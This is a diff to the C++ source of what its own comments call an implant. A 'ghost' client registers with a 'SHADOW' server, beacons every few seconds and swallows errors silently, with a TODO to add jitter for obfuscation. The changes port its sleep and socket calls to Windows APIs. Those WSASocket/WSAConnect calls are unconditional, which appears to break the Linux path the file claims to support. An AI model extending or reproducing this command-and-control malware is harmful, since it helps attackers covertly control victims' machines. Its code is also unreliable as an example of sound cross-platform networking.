@@ -11,6 +11,7 @@
 // cross platform macros
 #ifdef _WIN32
     #include <winsock2.h>
+    #include <windows.h>
     #include <ws2tcpip.h>
     #pragma comment(lib, "ws2_32.lib")
 
@@ -21,6 +22,8 @@
 
     #define POPEN _popen
     #define PCLOSE _pclose
+
+    #define SLEEP Sleep
 
     const std::string OS_PLATFORM = "windows";
     const int SLEEP_MULTIPLIER = 1000;
@@ -39,6 +42,8 @@
 
     #define POPEN popen
     #define PCLOSE pclose
+
+    #define SLEEP sleep
     
     const std::string OS_PLATFORM = "linux";
     const int SLEEP_MULTIPLIER = 1;
@@ -162,16 +167,16 @@ public:
     }
 
     std::string sendHttpRequest(const std::string& method, const std::string& uri, const std::string& body = "") {
-        SOCKET_TYPE sock = socket(AF_INET, SOCK_STREAM, 0); // we only support ipv4 for the foreseeable future; SOCK_STREAM = TCP, SOCK_DGRAM = UDP
+        SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // we only support ipv4 for the foreseeable future; SOCK_STREAM = TCP, SOCK_DGRAM = UDP
         if (!IS_VALID_SOCKET(sock)) return "";
 
         // prepare connection
-        sockaddr_in server_addr;
+        struct sockaddr_in server_addr{};
         server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons(port);
         inet_pton(AF_INET, host.c_str(), &server_addr.sin_addr);
+        server_addr.sin_port = htons(port);
 
-        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+        if (WSAConnect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
             CLOSE_SOCKET(sock);
             return "";  // silent error the default in implants
         }
@@ -270,7 +275,7 @@ public:
             // sleep until next pulse
 
             // TODO: jitter for obfuscation
-            sleep(5 * SLEEP_MULTIPLIER);
+            SLEEP(5 * SLEEP_MULTIPLIER);
         }
     }
 };
@@ -286,7 +291,7 @@ int main() {
 
     // try to register with SHADOW
     while (!ghost.registerGhost()) {
-        sleep(5 * SLEEP_MULTIPLIER);
+        SLEEP(5 * SLEEP_MULTIPLIER);
     }
 
     // for now just beacon
